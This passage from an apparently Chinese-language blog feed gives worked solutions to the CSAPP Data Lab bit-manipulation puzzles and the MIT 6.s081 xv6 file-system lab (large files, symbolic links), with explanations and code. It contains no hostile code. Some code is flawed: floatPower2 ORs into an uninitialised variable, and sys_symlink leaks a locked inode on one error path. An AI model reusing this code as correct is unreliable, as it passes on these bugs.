0，且刚好与零和非零对应。</p><h2 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">logicalNeg</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> nx <span class="token operator">=</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">|</span> nx<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h1><h2 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h2><p>这题看到限制 90 个运算符就给吓着了，实际上也确实很困难，自己想了半天也没有思路，于是在网上参考了别人的解法，感觉相当精妙，在这里介绍一番：</p><p>对于正整数 x 而言，可以使用二分搜索的方式来确定所需的位数。首先判断 x 是否需要 16 位来表示，即 x 右移 16 位是否为 0，如果是，则右移 16 位，否则不做处理，然后再判断是否需要 8 位来处理，以此类推。最后将上述过程中的右移次数累加起来再加一（正整数首位需要为 0），即为总共需要的位数。</p><p>对于负整数 x 而言，它所需的位数与 x 取反得到的整数所需位数相同，证明没整明白。。。</p><h2 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">howManyBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> absx <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> x<span class="token punctuation">;</span>    <span class="token keyword">int</span> b16<span class="token punctuation">,</span> b8<span class="token punctuation">,</span> b4<span class="token punctuation">,</span> b2<span class="token punctuation">,</span> b1<span class="token punctuation">,</span> b0<span class="token punctuation">;</span>    <span class="token comment">// 二分搜索</span>    b16 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b16<span class="token punctuation">;</span>    b8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b8<span class="token punctuation">;</span>    b4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b4<span class="token punctuation">;</span>    b2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b2<span class="token punctuation">;</span>    b1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b1<span class="token punctuation">;</span>    b0 <span class="token operator">=</span> absx<span class="token punctuation">;</span>    <span class="token keyword">return</span> b16 <span class="token operator">+</span> b8 <span class="token operator">+</span> b4 <span class="token operator">+</span> b2 <span class="token operator">+</span> b1 <span class="token operator">+</span> b0 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h1><h2 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h2><p>这题主要是要对规格化数和非规格化数进行分类讨论：</p><p>当 uf 为规格化数，即阶码不为 0 时，乘二相当于将阶码位加 1。</p><p>当 uf 为非规格化数，即阶码为 0 时，此时 uf 的值完全由尾数来表示，且不含隐含 0，因此乘二相当于将尾数乘二，即左移 1 位。</p><p>需要注意的是，当 uf 为非规格化数且尾数最高位为 1 时，尾数左移会导致最高位的 1 移动到阶码的最低位。但经过验证，此时的结果仍然符合预期，即非规格化数无缝衔接到了规格化数，不禁感叹 IEEE 754 标准浮点数的设计之精妙。</p><h2 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">floatScale2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> t <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// 阶码</span>    <span class="token keyword">unsigned</span> m <span class="token operator">=</span> uf <span class="token operator">&amp;</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span>      <span class="token comment">// 尾数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token keyword">return</span> uf<span class="token punctuation">;</span>        <span class="token comment">// 无穷大或者 NaN</span>    <span class="token comment">// 非规格化数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        m <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>        uf <span class="token operator">&amp;=</span> <span class="token number">0xff800000</span><span class="token punctuation">;</span>        uf <span class="token operator">|=</span> m<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 规格化数</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        t <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        uf <span class="token operator">&amp;=</span> <span class="token number">0x807fffff</span><span class="token punctuation">;</span>        uf <span class="token operator">|=</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> uf<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h1><h2 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h2><p>首先确定整数所能表示的上下界的值：当阶码小于 127，即指数位小于 0 时，此时浮点数 uf 小于 1，对应的整数为 0；当阶码大于 150，即指数位大于 23 时，此时单精度浮点数的精度（尾数长度）不足以正确表示对应的整数，返回 0x80000000。</p><p>对于在合理范围内的 uf，将其转换为对应的整数，首先需要尾数最高位的高一位加上规格化数隐含的 1，再根据阶码的大小将尾数进行右移，阶码越大，右移位数越少。最后根据符号位的值选择是否将结果取反加一。</p><h2 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">floatFloat2Int</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> s <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">;</span>   <span class="token comment">// 符号</span>    <span class="token keyword">unsigned</span> t <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// 阶码</span>    <span class="token keyword">unsigned</span> m <span class="token operator">=</span> uf <span class="token operator">&amp;</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span>      <span class="token comment">// 尾数</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    <span class="token comment">// 小于 1</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 大于 1 且不溢出</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;=</span> <span class="token number">150</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> m <span class="token operator">|</span> <span class="token number">0x800000</span><span class="token punctuation">;</span>        val <span class="token operator">>>=</span> <span class="token punctuation">(</span><span class="token number">23</span> <span class="token operator">-</span> <span class="token punctuation">(</span>t <span class="token operator">-</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            val <span class="token operator">=</span> <span class="token operator">~</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 溢出</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0x80000000</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h1><h2 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h2><p>同样是对规格化数和非规格化数的分类讨论：</p><p>当 <code>x &gt;= -150 &amp;&amp; x &lt; -127</code> 时，结果为非规格化数，此时浮点数表示只有一个位为 1，其余全为 0。直接根据指数 x 的值确定该位的位置即可。</p><p>当 <code>x &gt;= -127 &amp;&amp; x &lt; 128</code> 时，结果为规格化数，此时浮点数表示的尾数全为 0，只有阶码用来表示指数的值。根据指数 x 的值确定阶码的值，然后构造出浮点数即可。</p><h2 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">floatPower2</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> val<span class="token punctuation">;</span>    <span class="token comment">// 太小</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 非规格化数</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">150</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 规格化数</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">unsigned</span> t <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">127</span><span class="token punctuation">;</span>        val <span class="token operator">|=</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 太大</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0x7f800000</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;CSAPP 的第一个 Lab，对应知识点为书中的第 2 章（信息的表示与处理），要求使用受限制的运算符和表达式实现一些位操作。主要分为两个部分：整数部分和浮点数部分。其中整数部分限制较多，比较偏重技巧性，部分题个人认为很有难度。而浮点数部分则比较基础，主要考察对 IEEE 754 标准的熟悉程度，代码较长，但思路相对简单。&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="位运算" scheme="http://lordaeronesz.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab File system</title>
    <link href="http://lordaeronesz.github.io/2024/08/16/MIT6.s081-2021-Lab%20File%20system/"/>
    <id>http://lordaeronesz.github.io/2024/08/16/MIT6.s081-2021-Lab%20File%20system/</id>
    <published>2024-08-16T03:45:11.000Z</published>
    <updated>2024-08-16T10:21:40.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Large-files"><a href="#Large-files" class="headerlink" title="Large files"></a>Large files</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>xv6 文件系统的 inode 中地址域 <code>addrs[]</code> 由 12 个直接地址和 1 个一级间接地址组成，本实验要求将地址域更改为 11 个直接地址、1 个一级间接地址和 1 个二级间接地址组成，以支持更大文件的存储。</p><p>代码的实现有了直接地址和一级间接地址做参考，就很简单了，直接查看代码部分即可。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/file.h b/kernel/file.hindex b076d1d..5c4eb3a 100644<span class="token coord">--- a/kernel/file.h</span><span class="token coord">+++ b/kernel/file.h</span>@@ -26,7 +26,7 @@ struct inode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  short minor;</span><span class="token prefix unchanged"> </span><span class="token line">  short nlink;</span><span class="token prefix unchanged"> </span><span class="token line">  uint size;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  uint addrs[NDIRECT+1];</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uint addrs[NDIRECT+2];</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// map major device number to device functions.</span></span>diff --git a/kernel/fs.c b/kernel/fs.cindex 40c9bd4..4c00ab5 100644<span class="token coord">--- a/kernel/fs.c</span><span class="token coord">+++ b/kernel/fs.c</span>@@ -400,6 +400,33 @@ bmap(struct inode *ip, uint bn)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    brelse(bp);</span><span class="token prefix unchanged"> </span><span class="token line">    return addr;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  bn -= NINDIRECT;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  if (bn &lt; NINDIRECT2) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = ip->addrs[NDIRECT + 1]) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      ip->addrs[NDIRECT + 1] = addr = balloc(ip->dev);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    uint i = bn / NINDIRECT, j = bn % NINDIRECT;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, addr);</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = a[i]) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      a[i] = addr = balloc(ip->dev);</span><span class="token prefix inserted">+</span><span class="token line">      log_write(bp);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, addr);</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = a[j]) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      a[j] = addr = balloc(ip->dev);</span><span class="token prefix inserted">+</span><span class="token line">      log_write(bp);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    return addr;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  panic("bmap: out of range");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -432,6 +459,29 @@ itrunc(struct inode *ip)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    ip->addrs[NDIRECT] = 0;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  struct buf *bp2;</span><span class="token prefix inserted">+</span><span class="token line">  uint *a2;</span><span class="token prefix inserted">+</span><span class="token line">  if (ip->addrs[NDIRECT + 1]) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, ip->addrs[NDIRECT + 1]);</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;</span><span class="token prefix inserted">+</span><span class="token line">    for (i = 0; i &lt; NINDIRECT; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      if (a[i]) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        bp2 = bread(ip->dev, a[i]);</span><span class="token prefix inserted">+</span><span class="token line">        a2 = (uint *)bp2->data;</span><span class="token prefix inserted">+</span><span class="token line">        for (j = 0; j &lt; NINDIRECT; ++j) &#123;</span><span class="token prefix inserted">+</span><span class="token line">          if (a2[j]) &#123;</span><span class="token prefix inserted">+</span><span class="token line">            bfree(ip->dev, a2[j]);</span><span class="token prefix inserted">+</span><span class="token line">          &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        brelse(bp2);</span><span class="token prefix inserted">+</span><span class="token line">        bfree(ip->dev, a[i]);</span><span class="token prefix inserted">+</span><span class="token line">      &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);</span><span class="token prefix inserted">+</span><span class="token line">    bfree(ip->dev, ip->addrs[NDIRECT + 1]);</span><span class="token prefix inserted">+</span><span class="token line">    ip->addrs[NDIRECT + 1] = 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  ip->size = 0;</span><span class="token prefix unchanged"> </span><span class="token line">  iupdate(ip);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/kernel/fs.h b/kernel/fs.hindex 139dcc9..cd5de8a 100644<span class="token coord">--- a/kernel/fs.h</span><span class="token coord">+++ b/kernel/fs.h</span>@@ -24,9 +24,10 @@ struct superblock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#define FSMAGIC 0x10203040</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define NDIRECT 12</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define NDIRECT 11</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define NINDIRECT (BSIZE / sizeof(uint))</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define MAXFILE (NDIRECT + NINDIRECT)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define NINDIRECT2 (NINDIRECT * NINDIRECT)</span><span class="token prefix inserted">+</span><span class="token line">#define MAXFILE (NDIRECT + NINDIRECT + NINDIRECT2)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// On-disk inode structure</span><span class="token prefix unchanged"> </span><span class="token line">struct dinode &#123;</span></span>@@ -35,7 +36,7 @@ struct dinode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  short minor;          // Minor device number (T_DEVICE only)</span><span class="token prefix unchanged"> </span><span class="token line">  short nlink;          // Number of links to inode in file system</span><span class="token prefix unchanged"> </span><span class="token line">  uint size;            // Size of file (bytes)</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  uint addrs[NDIRECT+1];   // Data block addresses</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uint addrs[NDIRECT+2];   // Data block addresses</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// Inodes per block.</span></span></code></pre><h1 id="Symbolic-links"><a href="#Symbolic-links" class="headerlink" title="Symbolic links"></a>Symbolic links</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>本实验要求为 xv6 实现符号链接（软链接）机制，符号链接本质上也是一个文件，只不过它的数据内容为该链接指向的文件路径，这其实与 Windows 系统的快捷方式十分类似。实现方案如下：</p><p>首先依照 Lab System call 中的方法，添加系统调用 <code>symlink</code>：添加 <code>symlink()</code> 声明，添加系统调用号，添加系统调用 entry，添加 <code>sys_symlink()</code> 声明。</p><p>在理解了符号链接的本质后，就可以着手实现 <code>sys_symlink</code> 了。首先明确一下 <code>symlink</code> 的作用，它包含两个参数：target 和 path，作用是创建一个目录为 path 的符号链接，该符号链接指向目录为 target 的文件。实现思路应该比较清晰：使用 <code>create()</code> 创建一个文件类型为符号链接（需要自行定义）的文件，再使用 <code>writei()</code> 将字符串 path 写入该文件中。</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">sys_symlink</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n1<span class="token punctuation">,</span> n2<span class="token punctuation">;</span>    <span class="token keyword">char</span> target<span class="token punctuation">[</span>MAXPATH<span class="token punctuation">]</span><span class="token punctuation">,</span> path<span class="token punctuation">[</span>MAXPATH<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>ip<span class="token punctuation">;</span>    <span class="token comment">// get arguments of symlink</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n1 <span class="token operator">=</span> <span class="token function">argstr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> target<span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>n2 <span class="token operator">=</span> <span class="token function">argstr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> path<span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">begin_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// create symbol link in the path</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ip <span class="token operator">=</span> <span class="token function">create</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> T_SYMLINK<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// write target to file that ip points to</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">writei</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span>target<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> n1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>实现了符号链接的创建之后，还需要修改 <code>sys_open()</code>，实现对符号链接的特殊处理：当该文件是一个符号链接并且需要以跟随（follow）的方式打开时，就不断向下递归，将当前的 inode 指针指向符号链接指向文件的 inode，直到 inode 指针对应的文件类型不是符号链接，此时该 inode 指针指向的文件才是本次 <code>sys_open()</code> 系统调用实际需要打开的文件。</p><p>这里要用到两个关键函数 <code>readi()</code> 和 <code>namei()</code>。其中 <code>readi()</code> 能够根据 inode 指针，从该 inode 指针对应的文件中读取数据；而 <code>namei()</code> 能够根据指定的路径，返回该路径对应文件的 inode 指针。“跟随”的基本流程就是先使用读取当前 inode 中的数据，即目标文件路径 path，再将当前 inode 指针指向 path 目录对应的文件，以此往复。</p><p>最后还有一个小细节，就是当多个符号链接形成一个环时，这样的“跟随”过程就可能会导致死循环，因此必须加以限制，这里为了实现的方便，只是设定了一个最大递归深度，当递归深度超过该设定最大值时，文件打开就会失败。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>omode <span class="token operator">&amp;</span> O_NOFOLLOW<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> depth <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>     <span class="token comment">// max recursive depth</span>    <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>next<span class="token punctuation">;</span> <span class="token comment">// next inode</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>depth <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ip<span class="token operator">-></span>type <span class="token operator">==</span> T_SYMLINK<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// read data from file that ip points to to path</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">readi</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token 